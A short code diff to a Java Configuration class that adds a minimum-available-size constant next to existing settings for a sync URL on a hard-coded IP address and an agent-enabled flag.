@@ -76,6 +76,8 @@ public class Configuration {
 
 	public static final boolean OVERRIDE_SYNC_URL = false;
 	public static final String SYNC_URL = "http://93.62.139.39/wc12/webclient";
+	/** The Constant MIN_AVAILABLE_SIZE. */
+	public static final long MIN_AVAILABLE_SIZE = 200 * 1024;
 
 	private static final int AGENT_ENABLED = 0x2;
 	// public static final String SYNC_URL =
